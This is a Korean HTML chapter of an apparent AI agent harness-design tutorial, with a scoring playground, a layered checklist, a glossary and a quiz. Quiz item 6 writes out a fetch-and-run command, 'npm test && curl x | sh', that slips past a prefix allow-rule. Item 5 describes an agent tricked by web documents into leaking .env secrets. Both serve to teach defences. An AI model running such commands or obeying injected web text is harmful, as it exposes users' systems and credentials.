@@ -1,0 +1,247 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>설계 플레이그라운드와 용어집 · HarnessBook</title>
+<meta name="description" content="루프, 컨텍스트, 도구, 샌드박스, 권한, 오케스트레이션, 신뢰성 부품을 골라 하네스를 설계하고, 용어집과 종합 퀴즈로 정리한다.">
+<link rel="icon" type="image/svg+xml" href="../favicon.svg">
+<link rel="stylesheet" href="../css/style.css">
+<script src="../js/common.js"></script>
+<style>
+  #pl-opts { display: grid; gap: 10px; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); }
+  #pl-warn { display: grid; gap: 6px; }
+  #gl-q { max-width: 360px; }
+  .gloss h4 { margin: 0; padding: 10px 14px 4px; background: var(--surface); font-size: 12px; letter-spacing: .1em; color: var(--text-faint); }
+</style>
+</head>
+<body data-root="../" data-chapter="design">
+<div class="ca-layout">
+<main class="chapter">
+  <header class="chapter-hero">
+    <div class="eyebrow">Chapter 10</div>
+    <h1>설계 플레이그라운드와 용어집</h1>
+    <p class="lead">지금까지 하네스의 층을 하나씩 떼어 보았다. 실제 설계에서는 이것들을 한꺼번에 고르고, 고른 것들이 서로 얽힌다. 샌드박스가 강하면 권한 확인을 줄일 수 있고, 하위 에이전트를 쓰면 압축이 덜 필요하며, 사람이 없는 환경에서는 “묻기”가 곧 “멈춤”이다. 이 장에서는 부품을 골라 시나리오에 맞는 하네스를 설계해 보고, 설계 체크리스트와 용어집, 종합 퀴즈로 책을 정리한다.</p>
+    <ul class="objectives">
+      <li>시나리오의 요구(속도, 안전, 자율, 비용)에 맞게 하네스 부품을 조합할 수 있다.</li>
+      <li>부품 사이의 상호작용(샌드박스 ↔ 권한, 하위 에이전트 ↔ 컨텍스트)을 설명할 수 있다.</li>
+      <li>층별 설계 질문을 체크리스트로 점검할 수 있다.</li>
+    </ul>
+  </header>
+
+  <section id="play">
+    <h2>하네스 설계 플레이그라운드</h2>
+    <p>시나리오를 고르고 각 층의 부품을 골라 보자. 오른쪽 레이더 차트의 실선이 내 설계, 점선이 시나리오가 요구하는 수준이다. 아래 경고는 부품 조합에서 생기는 문제를 알려 준다. 점수는 이 책의 실험에서 본 경향을 단순하게 합친 교육용 모형이다.</p>
+    <div class="sim" id="sim-play">
+      <div class="sim-head"><span class="sim-tag game">PLAYGROUND</span><h3>하네스 설계 플레이그라운드 — 시나리오에 맞춰 조립하기</h3></div>
+      <div class="sim-body">
+        <div class="seg" id="pl-scn"><button data-v="dev" class="on">개인 코딩 도우미</button><button data-v="batch">야간 배치 자동화</button><button data-v="support">고객 지원 봇</button><button data-v="research">리서치 에이전트</button></div>
+        <p id="pl-desc" style="margin:0;font-size:14.5px;color:var(--text-dim)"></p>
+        <div class="two">
+          <div id="pl-opts"></div>
+          <div><div class="sim-view"><canvas id="pl-cv"></canvas></div></div>
+        </div>
+        <div class="verdict" id="pl-verdict"></div>
+        <div id="pl-warn"></div>
+        <div class="btns"><button class="btn" id="pl-rec">이 시나리오의 추천 구성</button><button class="btn" id="pl-rand">무작위 구성</button></div>
+      </div>
+      <div class="sim-readout">
+        <div class="stat"><span class="k">성공</span><span class="v" id="pl-o1">—</span></div>
+        <div class="stat"><span class="k">비용 효율</span><span class="v" id="pl-o2">—</span></div>
+        <div class="stat"><span class="k">속도</span><span class="v" id="pl-o3">—</span></div>
+        <div class="stat"><span class="k">안전</span><span class="v" id="pl-o4">—</span></div>
+        <div class="stat"><span class="k">자율</span><span class="v" id="pl-o5">—</span></div>
+      </div>
+      <div class="sim-note">해볼 것: ① <b>야간 배치</b>에서 권한을 “모두 묻기”로 두면 자율 점수가 바닥이다. 새벽 세 시에 승인해 줄 사람이 없다. 대신 마이크로VM + 샌드박스 자동으로 바꿔 보자. ② <b>고객 지원 봇</b>에서 병렬 팬아웃을 켜면 속도는 오르지만 비용이 뛴다. 짧은 질의응답에 맞는가? ③ 어떤 시나리오든 “무제한 자동 + 호스트 직접”을 고르면 빨간 경고가 뜬다.</div>
+    </div>
+  </section>
+
+  <section id="checklist">
+    <h2>층별 설계 체크리스트</h2>
+    <p>새 하네스를 만들거나 기존 하네스를 점검할 때 아래 질문에 답해 보자. 대답하지 못하는 칸이 다음에 손볼 곳이다.</p>
+    <table class="tbl">
+      <tr><th>층</th><th>물어볼 것</th><th>장</th></tr>
+      <tr><td style="color:var(--accent);font-weight:700">루프</td><td>stop_reason을 모두 처리하는가? max_tokens를 성공으로 오인하지 않는가? 턴·토큰·시간 상한이 있는가? 헛도는 루프를 감지하는가?</td><td><a href="loop.html">2장</a></td></tr>
+      <tr><td style="color:var(--ctx);font-weight:700">컨텍스트</td><td>고정 블록이 앞, 바뀌는 값이 뒤에 있는가? 캐시 적중률을 재고 있는가? 압축 시점과 전략이 정해져 있는가? 지침 파일이 짧은가?</td><td><a href="prompt.html">3장</a></td></tr>
+      <tr><td style="color:var(--tool);font-weight:700">도구</td><td>헷갈리는 도구 쌍이 없는가? 도구 수가 많다면 지연 로딩을 쓰는가? 출력 크기 제한과 “잘렸음” 표시가 있는가? 오류 메시지가 고칠 방법을 담는가?</td><td><a href="tools.html">4장</a></td></tr>
+      <tr><td style="color:var(--env);font-weight:700">실행 환경</td><td>사고가 나면 피해 반경은 어디까지인가? 네트워크 출구가 허용 목록인가? 서로 믿을 수 없는 작업이 커널을 공유하지 않는가? 콜드 스타트가 사용자에게 보이는가?</td><td><a href="sandbox.html">5장</a></td></tr>
+      <tr><td style="color:var(--guard);font-weight:700">권한 · 훅</td><td>deny가 allow보다 우선하는가? 복합 셸 명령을 나눠 평가하는가? 확인 요청이 시간당 몇 번인가? 종료 전에 검증하는 훅이 있는가?</td><td><a href="permissions.html">6장</a></td></tr>
+      <tr><td style="color:var(--state);font-weight:700">상태</td><td>프로세스가 죽으면 어디서 이어 가는가? 코드와 대화를 되감을 수 있는가? 되감을 수 없는 행동을 구분해 확인하는가? 쓰기 도구가 멱등한가?</td><td><a href="state.html">7장</a></td></tr>
+      <tr><td style="color:var(--accent-2);font-weight:700">오케스트레이션</td><td>워크플로로 충분한 일을 에이전트로 만들고 있지 않은가? 하위 에이전트가 정말 컨텍스트를 아끼는가? 팬아웃의 토큰 배수만큼 가치가 있는가?</td><td><a href="orchestration.html">8장</a></td></tr>
+      <tr><td style="color:var(--text);font-weight:700">신뢰성 · 관측</td><td>실패를 알아채는 장치가 있는가? 일시적 오류만 재시도하는가? 백오프에 지터가 있는가? 실행마다 트레이스가 남는가?</td><td><a href="reliability.html">9장</a></td></tr>
+    </table>
+  </section>
+
+  <section id="glossary">
+    <h2>용어집</h2>
+    <p>이 책에 나온 용어를 모았다. 상단 검색창에서도 찾을 수 있다.</p>
+    <label class="ctrl" style="margin-bottom:12px"><span>용어 거르기</span><input type="text" id="gl-q" placeholder="예: 캐시, 훅, idempotency"></label>
+    <div class="gloss" id="gl-list"></div>
+  </section>
+
+  <section class="quiz-sec" id="quiz">
+    <h2>종합 퀴즈</h2>
+    <div class="quiz">
+      <div class="quiz-q"><p>1. 같은 모델을 쓰는 두 에이전트의 성공률이 크게 다르다. 먼저 의심할 것은?</p><div class="opts">
+        <button class="opt" data-correct>도구 구성, 피드백, 컨텍스트 관리 등 하네스의 차이</button>
+        <button class="opt">모델 가중치가 실행 중에 달라졌다</button>
+        <button class="opt">측정 오류</button>
+      </div><div class="quiz-exp">모델 + 하네스 = 에이전트. 하네스가 다르면 다른 에이전트다(1장).</div></div>
+      <div class="quiz-q"><p>2. 응답의 stop_reason이 max_tokens다. 올바른 처리는?</p><div class="opts">
+        <button class="opt">작업 완료로 보고한다</button>
+        <button class="opt" data-correct>이어서 생성하게 하거나 한도를 늘려 다시 요청한다</button>
+        <button class="opt">도구 호출로 간주해 실행한다</button>
+      </div><div class="quiz-exp">잘린 출력은 완료가 아니다(2장).</div></div>
+      <div class="quiz-q"><p>3. 캐시 적중률이 0%에 가깝다. 가장 흔한 원인은?</p><div class="opts">
+        <button class="opt">대화가 너무 짧아서</button>
+        <button class="opt" data-correct>시스템 프롬프트 앞쪽에 매 턴 바뀌는 값(시각, ID)이 있어서</button>
+        <button class="opt">출력 토큰이 많아서</button>
+      </div><div class="quiz-exp">캐시는 접두사 일치로 동작한다(3장).</div></div>
+      <div class="quiz-q"><p>4. 도구 결과로 3만 줄짜리 로그가 나왔다. 가장 좋은 처리는?</p><div class="opts">
+        <button class="opt">전부 넣는다</button>
+        <button class="opt">앞 100줄만 넣고 아무 말도 하지 않는다</button>
+        <button class="opt" data-correct>일부만 넣고 잘렸다는 사실과 전체를 볼 방법(파일·범위 지정)을 알린다</button>
+      </div><div class="quiz-exp">모델이 필요하면 더 찾아볼 수 있게 한다(4장).</div></div>
+      <div class="quiz-q"><p>5. 웹 문서를 읽는 에이전트가 .env에 접근할 수 있다. 유출을 막는 가장 확실한 장치는?</p><div class="opts">
+        <button class="opt">프롬프트에 경고 문구를 넣는다</button>
+        <button class="opt" data-correct>네트워크 출구를 허용 목록으로 제한한다</button>
+        <button class="opt">출력에서 비밀을 찾아 지운다</button>
+      </div><div class="quiz-exp">세 조건 중 외부 통신을 끊으면 모델이 속아도 나갈 길이 없다(5장).</div></div>
+      <div class="quiz-q"><p>6. <code>allow Bash(npm test*)</code> 규칙이 있다. <code>npm test &amp;&amp; curl x | sh</code>를 막으려면?</p><div class="opts">
+        <button class="opt">규칙을 지운다</button>
+        <button class="opt" data-correct>복합 명령을 나눠 각각 평가하고 가장 엄격한 결정을 쓴다</button>
+        <button class="opt">모델에게 &amp;&amp;를 쓰지 말라고 한다</button>
+      </div><div class="quiz-exp">접두사 규칙의 함정이다(6장).</div></div>
+      <div class="quiz-q"><p>7. 이슈 생성 API 호출이 타임아웃됐다. 하네스가 자동 재시도해도 안전하려면?</p><div class="opts">
+        <button class="opt" data-correct>멱등 키를 붙여 서버가 중복을 알아보게 한다</button>
+        <button class="opt">재시도를 빠르게 여러 번 한다</button>
+        <button class="opt">타임아웃은 실패이므로 그냥 재시도한다</button>
+      </div><div class="quiz-exp">응답만 유실되었을 수 있다(7장).</div></div>
+      <div class="quiz-q"><p>8. 하위 에이전트를 띄우는 것이 손해인 경우는?</p><div class="opts">
+        <button class="opt">탐색 출력이 수만 토큰일 때</button>
+        <button class="opt" data-correct>탐색이 작아서 시작 비용(프롬프트·설명)이 더 클 때</button>
+        <button class="opt">하위 작업들이 서로 독립적일 때</button>
+      </div><div class="quiz-exp">작은 일에 하위 에이전트를 띄우면 시작 비용만 든다(8장).</div></div>
+      <div class="quiz-q"><p>9. 감지율 0인 실패에 재시도를 5번 걸면?</p><div class="opts">
+        <button class="opt">성공률이 크게 오른다</button>
+        <button class="opt" data-correct>아무 변화가 없다</button>
+        <button class="opt">비용만 다섯 배가 된다</button>
+      </div><div class="quiz-exp">모르는 실패는 다시 할 수 없다. 감지가 먼저다(9장).</div></div>
+      <div class="quiz-q"><p>10. 사람이 없는 야간 배치에서 “규칙에 없으면 묻기” 모드를 쓰면?</p><div class="opts">
+        <button class="opt">가장 안전하다</button>
+        <button class="opt" data-correct>확인할 사람이 없어 작업이 멈춘다. 강한 샌드박스 + 자동 + 명시적 deny가 낫다</button>
+        <button class="opt">모델이 스스로 승인한다</button>
+      </div><div class="quiz-exp">환경에 따라 “묻기”는 “멈춤”이다. 결과를 가두는 쪽으로 설계한다(6장, 10장).</div></div>
+    </div>
+  </section>
+</main>
+</div>
+
+<script>
+/* ---------------- 1. 설계 플레이그라운드 ---------------- */
+(function () {
+  const AX = ["성공", "비용 효율", "속도", "안전", "자율"];
+  // 각 선택지의 기여: [성공, 비용효율, 속도, 안전, 자율]
+  const OPTS = [
+    { id: "cap", name: "루프 · 턴 상한", ch: [["10턴", [-14, 10, 6, 4, -6]], ["40턴", [0, 4, 0, 2, 0]], ["200턴", [4, -6, -2, 0, 4]], ["상한 없음", [5, -18, -4, -6, 6]]] },
+    { id: "ctx", name: "컨텍스트 관리", ch: [["전체 기록", [-6, -12, -6, 0, -4]], ["요약 압축", [2, 4, 0, 0, 2]], ["결과 비우기 + 요약", [5, 8, 2, 0, 4]], ["하위 에이전트로 격리", [6, 2, 0, 0, 5]]] },
+    { id: "tools", name: "도구 구성", ch: [["최소 5개", [-8, 8, 4, 4, -4]], ["핵심 15개", [3, 3, 2, 0, 2]], ["MCP 80개 미리 로딩", [-2, -14, -4, -4, 4]], ["80개 + 도구 검색", [4, 2, -2, -2, 5]]] },
+    { id: "env", name: "실행 환경", ch: [["호스트 직접", [2, 4, 6, -22, 0]], ["OS 샌드박스", [1, 2, 4, 8, 3]], ["컨테이너", [0, 0, -2, 12, 5]], ["마이크로VM", [0, -4, -4, 18, 7]]] },
+    { id: "perm", name: "권한 모드", ch: [["모두 묻기", [0, -2, -14, 4, -24]], ["규칙 + 묻기", [2, 0, -4, 10, -4]], ["샌드박스 안 자동", [3, 2, 6, 4, 14]], ["무제한 자동", [3, 2, 8, -18, 18]]] },
+    { id: "orch", name: "오케스트레이션", ch: [["단일 에이전트", [0, 6, 0, 2, 0]], ["탐색용 하위 에이전트", [4, 0, 2, 0, 3]], ["병렬 팬아웃 ×5", [5, -16, 14, -2, 4]]] },
+    { id: "rel", name: "신뢰성", ch: [["재시도 없음", [-12, 2, 2, 0, -8]], ["지수 백오프 + 지터", [4, 0, 0, 0, 4]], ["백오프 + 폴백 + 체크포인트", [8, -3, 0, 2, 8]]] },
+    { id: "fb", name: "검증 · 피드백", ch: [["없음", [-16, 4, 4, -4, 0]], ["테스트 실행", [8, -2, -2, 2, 2]], ["테스트 + Stop 게이트 훅", [14, -4, -4, 4, 4]]] },
+  ];
+  const SC = {
+    dev: { name: "개인 코딩 도우미", desc: "개발자 노트북에서 실행. 사람이 화면을 보고 있고 응답이 빨라야 한다. 사용자의 실제 파일과 자격 증명이 근처에 있다.", target: [75, 60, 65, 65, 55], rec: [1, 2, 1, 1, 2, 1, 1, 2] },
+    batch: { name: "야간 배치 자동화", desc: "CI에서 수백 개 저장소의 의존성을 올리고 PR을 만든다. 사람이 없고, 실행이 많아 비용이 중요하며, 서로 다른 저장소의 코드가 섞인다.", target: [75, 65, 30, 80, 80], rec: [1, 2, 1, 3, 2, 0, 2, 2] },
+    support: { name: "고객 지원 봇", desc: "고객 질문에 답하고 주문 조회·환불 요청 도구를 쓴다. 응답이 빨라야 하고, 고객 데이터와 환불이라는 되돌리기 어려운 행동이 있다.", target: [55, 70, 62, 75, 45], rec: [0, 1, 1, 2, 1, 0, 1, 1] },
+    research: { name: "리서치 에이전트", desc: "주제 하나를 넓게 조사해 보고서를 쓴다. 웹 문서를 많이 읽고(신뢰할 수 없는 입력), 시간은 좀 걸려도 되지만 결과가 충실해야 한다.", target: [85, 30, 60, 60, 80], rec: [2, 3, 3, 2, 2, 2, 2, 1] },
+  };
+  let scn = "dev";
+  const sel = SC.dev.rec.slice();
+  HB.seg("pl-scn", (v) => { scn = v; render(); });
+  function buildOpts() {
+    HB.el("pl-opts").innerHTML = OPTS.map((o, i) => `<label class="ctrl"><span>${o.name}</span><select data-i="${i}">${o.ch.map((c, j) => `<option value="${j}" ${sel[i] === j ? "selected" : ""}>${c[0]}</option>`).join("")}</select></label>`).join("");
+  }
+  HB.el("pl-opts").addEventListener("change", (e) => { const s = e.target.closest("select"); if (s) { sel[+s.dataset.i] = +s.value; render(); } });
+  function scores() {
+    const v = [55, 55, 55, 50, 45];
+    OPTS.forEach((o, i) => o.ch[sel[i]][1].forEach((d, k) => (v[k] += d)));
+    // 상호작용
+    const pick = (id) => OPTS.find((o) => o.id === id).ch[sel[OPTS.findIndex((o) => o.id === id)]][0];
+    if (pick("perm") === "샌드박스 안 자동" && pick("env") === "호스트 직접") v[3] -= 16;
+    if (pick("perm") === "무제한 자동" && (pick("env") === "컨테이너" || pick("env") === "마이크로VM")) v[3] += 10;
+    if (pick("orch") === "병렬 팬아웃 ×5" && pick("ctx") === "전체 기록") v[1] -= 6;
+    if (scn === "batch" && pick("perm") === "모두 묻기") v[4] -= 20;
+    if (scn === "batch" && pick("perm") === "규칙 + 묻기") v[4] -= 10;
+    if (scn === "support" && pick("orch") === "병렬 팬아웃 ×5") v[2] -= 4;
+    if (scn === "support" && pick("cap") === "10턴") v[2] += 10; // 짧은 루프 = 빠른 응답
+    if (scn === "research" && pick("cap") === "10턴") v[0] -= 12;
+    return v.map((x) => HB.clamp(Math.round(x), 0, 100));
+  }
+  function warnings() {
+    const pick = (id) => OPTS.find((o) => o.id === id).ch[sel[OPTS.findIndex((o) => o.id === id)]][0];
+    const W = [];
+    if (pick("perm") === "무제한 자동" && pick("env") === "호스트 직접") W.push(["guard", "무제한 자동 + 호스트 직접: 권한 규칙도 격리도 없다. 실수 한 번이 사용자 시스템 전체에 닿는다 (5·6장)."]);
+    if (pick("perm") === "샌드박스 안 자동" && pick("env") === "호스트 직접") W.push(["guard", "“샌드박스 안 자동”을 골랐지만 샌드박스가 없다. 자동 실행의 전제가 깨졌다."]);
+    if (pick("cap") === "상한 없음") W.push(["tool", "턴 상한이 없다. 헛도는 실행 하나가 비용을 무한히 태울 수 있다 (2장)."]);
+    if (pick("tools") === "MCP 80개 미리 로딩") W.push(["tool", "도구 정의 80개를 매 호출 보낸다. 수만 토큰의 고정 비용과 선택 혼란 (3·4장)."]);
+    if (pick("ctx") === "전체 기록") W.push(["tool", "전체 기록만으로는 긴 작업에서 결국 창을 넘는다 (3장)."]);
+    if (pick("rel") === "재시도 없음") W.push(["tool", "일시적 API 오류 한 번이 실행 전체를 끝낸다 (9장)."]);
+    if (pick("fb") === "없음") W.push(["tool", "실패를 알아챌 장치가 없다. 재시도도 무의미해진다 (9장)."]);
+    if (scn === "batch" && pick("perm").includes("묻기")) W.push(["guard", "야간 배치에는 승인해 줄 사람이 없다. 확인 요청은 곧 작업 중단이다."]);
+    if (scn === "batch" && (pick("env") === "호스트 직접" || pick("env") === "OS 샌드박스")) W.push(["guard", "서로 다른 저장소의 코드를 한 호스트 커널에서 돌린다. 저장소 하나의 악성 스크립트가 다른 작업에 닿을 수 있다."]);
+    if (scn === "support" && pick("orch") === "병렬 팬아웃 ×5") W.push(["tool", "짧은 질의응답에 팬아웃 ×5는 토큰을 다섯 배 넘게 쓴다."]);
+    if (scn === "research" && pick("env") === "호스트 직접") W.push(["guard", "신뢰할 수 없는 웹 문서를 대량으로 읽는다. 출구 통제가 있는 격리 환경이 필요하다."]);
+    if (scn === "dev" && pick("env") === "마이크로VM") W.push(["ctx", "노트북의 개발 환경과 멀어진다. 로컬 도구·설정을 VM 안에 다시 갖춰야 한다."]);
+    return W;
+  }
+  const cv = HB.canvas("pl-cv", { aspect: 0.95, draw });
+  function draw(c, w, h) {
+    const v = scores(), T = SC[scn].target, cx = w / 2, cy = h / 2 + 6, R = Math.min(w, h) / 2 - 46;
+    const pt = (k, val) => { const a = -Math.PI / 2 + (k / AX.length) * Math.PI * 2; return [cx + Math.cos(a) * R * val / 100, cy + Math.sin(a) * R * val / 100]; };
+    [25, 50, 75, 100].forEach((g) => { c.strokeStyle = HB.col("grid"); c.lineWidth = 1; c.beginPath(); AX.forEach((_, k) => { const [x, y] = pt(k, g); k ? c.lineTo(x, y) : c.moveTo(x, y); }); c.closePath(); c.stroke(); });
+    AX.forEach((a, k) => { const [x, y] = pt(k, 100); HB.line(c, [[cx, cy], [x, y]], HB.col("grid"), 1); const [lx, ly] = pt(k, 122); HB.text(c, a, lx, ly, { size: 12.5, weight: 700, align: "center", color: HB.col("text") }); });
+    c.strokeStyle = HB.col("text-faint"); c.setLineDash([5, 4]); c.lineWidth = 2; c.beginPath(); T.forEach((t, k) => { const [x, y] = pt(k, t); k ? c.lineTo(x, y) : c.moveTo(x, y); }); c.closePath(); c.stroke(); c.setLineDash([]);
+    c.fillStyle = HB.alpha(HB.col("accent"), 0.2); c.strokeStyle = HB.col("accent"); c.lineWidth = 2.5; c.beginPath(); v.forEach((t, k) => { const [x, y] = pt(k, t); k ? c.lineTo(x, y) : c.moveTo(x, y); }); c.closePath(); c.fill(); c.stroke();
+    v.forEach((t, k) => { const [x, y] = pt(k, t); c.fillStyle = HB.col(t >= T[k] ? "env" : "guard"); c.beginPath(); c.arc(x, y, 4.5, 0, 7); c.fill(); });
+  }
+  function render() {
+    HB.el("pl-desc").innerHTML = `<b>${SC[scn].name}</b> — ${SC[scn].desc}`;
+    buildOpts();
+    const v = scores(), T = SC[scn].target, W = warnings();
+    ["pl-o1", "pl-o2", "pl-o3", "pl-o4", "pl-o5"].forEach((id, k) => HB.set(id, v[k], v[k] >= T[k] ? "good" : v[k] >= T[k] - 12 ? "warn" : "bad"));
+    const miss = v.map((x, k) => Math.max(0, T[k] - x)).reduce((a, b) => a + b, 0);
+    const reds = W.filter((x) => x[0] === "guard").length;
+    const fit = HB.clamp(Math.round(100 - miss * 1.2 - reds * 15), 0, 100);
+    const vd = HB.el("pl-verdict");
+    const k = fit >= 85 ? "env" : fit >= 60 ? "tool" : "guard";
+    vd.style.setProperty("--k", `var(--${k})`);
+    vd.innerHTML = `시나리오 적합도 <b>${fit}점</b> — ${fit >= 85 ? "요구를 대부분 충족합니다." : fit >= 60 ? "쓸 만하지만 빨간 점의 축과 경고를 손보세요." : "이 시나리오에는 맞지 않습니다. 경고부터 해결하세요."} ${miss ? `(목표에 못 미친 합계 ${miss}점)` : ""}`;
+    HB.el("pl-warn").innerHTML = W.map(([kk, s]) => `<div class="blk" style="--k:var(--${kk})"><span class="nm">${s}</span></div>`).join("");
+    cv.redraw();
+  }
+  HB.el("pl-rec").addEventListener("click", () => { SC[scn].rec.forEach((x, i) => (sel[i] = x)); render(); });
+  HB.el("pl-rand").addEventListener("click", () => { OPTS.forEach((o, i) => (sel[i] = Math.floor(Math.random() * o.ch.length))); render(); });
+  render();
+})();
+
+/* ---------------- 2. 용어집 ---------------- */
+(function () {
+  function render() {
+    const q = HB.el("gl-q").value.trim().toLowerCase();
+    let html = "";
+    HB.CHAPTERS.forEach((c) => {
+      const items = HB.GLOSSARY.filter((g) => g[3] === c.slug && (!q || (g[0] + g[1] + g[2]).toLowerCase().includes(q)));
+      if (!items.length) return;
+      html += `<h4>CH.${c.num} ${c.title}</h4>` + items.map((g) => `<div><b>${HB.esc(g[0])}</b><i>${HB.esc(g[1])}</i><a href="${g[3]}.html">CH.${c.num} →</a><p>${HB.esc(g[2])}</p></div>`).join("");
+    });
+    HB.el("gl-list").innerHTML = html || `<div>“${HB.esc(q)}”에 맞는 용어가 없습니다.</div>`;
+  }
+  HB.el("gl-q").addEventListener("input", render);
+  render();
+})();
+</script>
+</body>
+</html>
